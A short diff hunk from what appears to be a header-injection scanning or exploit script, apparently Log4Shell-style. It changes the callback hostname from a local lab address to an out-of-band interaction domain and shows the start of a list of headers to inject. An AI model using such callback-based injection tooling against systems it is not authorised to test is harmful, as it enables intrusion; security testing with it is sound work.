@@ -13,7 +13,7 @@ urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 logging.basicConfig(level=logging.INFO)
 
 # Change this to your DNS zone
-HOSTNAME = "10.10.14.12/poc"
+HOSTNAME = "c8uqb291r1j0o5dp1h40g9fnfcts3kuzx.oast.fun"
 
 header_injects = [
     'X-Api-Version',
